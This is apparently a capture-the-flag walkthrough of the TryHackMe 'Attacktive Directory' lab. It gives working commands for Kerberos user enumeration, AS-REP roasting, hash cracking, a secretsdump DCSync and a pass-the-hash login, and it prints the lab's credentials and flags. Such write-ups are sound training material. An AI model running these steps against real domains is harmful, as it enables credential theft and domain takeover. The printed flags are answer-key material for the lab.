## **TryHackMe: ATTACKTIVE DIRECTORY WALKTHROUGH** 
![](https://tryhackme.com/room/attacktivedirectory)
I'm putting together this walkthrough to solidify what I've learned from THM (TryHackMe). Before you begin, make sure to download kerbrute onto your machine. [You can grab it via wget from here](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64). Let's jump right in:

### *Step 1:*
Fire up your Kali machine and start the VPN you previously downloaded from THM:
`openvpn <vpnname>.ovpn`
Then go ahead and deploy the THM machine.

### *Step 2:*
To install Impacket, run the following commands in your terminal one by one:

`git clone https://github.com/SecureAuthCorp/impacket.git`

`/opt/impacket`

`pip3 install -r /opt/impacket/requirements.txt`

`cd /opt/impacket/ && python3 ./setup.py install`

### *Step 3:*
We'll kick things off with a basic port scan and enumeration using nmap. Later on, we'll use different tools for more specific enumeration tasks. Before doing any of this, let's create a notes.txt file to keep track of our findings, and run our nmap scan:

`nmap -v -sS -A -O -T4 <Target IP>`

![](https://github.com/hamza37yavuz/AttacktiveD-rectory-YolHaritas-/blob/main/nmap.png)

You can find the answers to the THM questions by reviewing the notes.txt file.

Ports 139 and 445 are used by SMB. To enumerate SMB, we'll use enum4linux.

`enum4linux <target ip> -a spookysec.local`

![](https://github.com/hamza37yavuz/AttacktiveD-rectory-YolHaritas-/blob/main/enum4linux.png)

The image above shows the user groups that were discovered — these have also been saved to notes.txt.

### *Step 4:*

There are several other services running as well, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, it becomes possible to brute-force user passwords and even perform password spraying. For this, we can use a tool called Kerbrute (created by Ronnie Flathers, @ropnop).

A pre-built user list and password list for this system will be used to speed up user enumeration and password cracking. We can download these lists using `wget`.

>[THM user list](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)

>[THM password list](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)

We'll use the `userenum` command with Kerbrute to pull valid usernames. To see how it works and explore usage options, navigate to the correct directory and run `./kerbrute -h`. To enumerate users, run the following command:

`./kerbrute userenum userlist.txt --dc <target ip> -d spookysec.local`

![alt text](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/kerbrute.png)

### *Step 5:*
Now that user enumeration is complete, we can try to abuse a Kerberos feature through an attack method called ASREPRoasting. This attack works when a user account has the "Does Not Require Pre-Authentication" privilege set. This means the account doesn't need to provide valid identification before requesting a Kerberos ticket for the specified user.

Impacket includes a tool called "GetNPUsers.py" that allows us to query ASReproastable accounts from the Key Distribution Center (located at impacket/examples/GetNPUsers.py). All we need is to pick an account from the list we enumerated via Kerbrute and try to retrieve a ticket. We'll use the usernames obtained in Step 4.

First, navigate to the `/opt/impacket/examples` directory. Then run GetNPUsers.py as follows to attempt to retrieve the password hash (ticket):

`python GetNPUsers.py -dc-ip <target ip> spookysec.local/<username> -no-pass` --> you can use svc-admin as the username

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/GetNPUsers.png)

We've obtained the hash and saved it to notes.txt. This is the password hash for the svc-admin user. To crack it, we'll use hashcat. We need the correct mode value to run hashcat — you can look it up on [this page](https://hashcat.net/wiki/doku.php?id=example_hashes).

We already pasted the hash into a text file earlier. Now we can crack it with the following command:

`hashcat -m 18200 hashCode.txt passwordlist.txt`

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/hashcat.jpeg)

And just like that, we find that svc-admin's password is management2005.

### *Step 6:*
With valid user credentials in hand, we now have significantly more access within the domain. It's time to dig deeper into share enumeration.

We can use smbclient to map remote SMB shares. This tool will help us discover and list remote shares. Let's run the following command to view the list:

`smbclient -L <target ip> -U svc-admin`

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/smbclient.png)

To access the backup share as svc-admin, run:

`smbclient \\\\<target ip>\\backup -U svc-admin`

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/backup.png)

What we find here looks like it could be an encoded password. Taking a closer look at the encoding, it resembles base64. We can decode it using [this tool](https://www.base64decode.org/). The decoded password and its encoded form are saved to notes.txt.

### *Step 7:*
Now that we have new account credentials, we may have even higher privileges on the system. The username "backup" is a strong hint about this account's purpose.

This is a backup account for the Domain Controller. It has a unique permission that allows all Active Directory changes to be synced with this user account — including password hashes.

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will let us dump all the password hashes that this backup account has access to. With this, we'll effectively gain full control over the Active Directory domain.

On my machine, this file is located at `/usr/share/doc/python3-impacket/examples`. We can retrieve the password hashes with the following command:

`python secretsdump.py -just-dc backup@10.10.36.93`

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/secretsdump.png)

The results are saved to notes.txt. Now we need to use the admin's hash to gain access to the Administrator account.

The Administrator's NTLM hash turns out to be 0e0363213e37b94221497260b0bcb4fc. To understand how the hash format works (each section between colons represents a different hash), check out [this link](https://security.stackexchange.com/questions/161889/understanding-windows-local-password-hashes-ntlm).

### *Step 8:*
To log in as admin using the hash, we'll use evil-winrm. Install it with:

`apt install evil-winrm`

Once installed, connect to the admin panel with:

`evil-winrm -i 10.10.36.93 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

![](https://github.com/hamza37yavuz/Attacktive-Directory-YolHaritasi-/blob/main/admin.png)

And there it is — our first and most important flag (Admin) -> `TryHackMe{4ctiveD1rectoryM4st3r}`

We note this down and continue navigating through the admin panel to access other user directories and capture the remaining flags:

 `(svc-admin)->TryHackMe{K3rb3r0s_Pr3_4uth}`
 
 `(backup)->TryHackMe{B4ckM3UpSc0tty!}`
 
All flags captured — challenge complete!
 
Thanks for reading :)
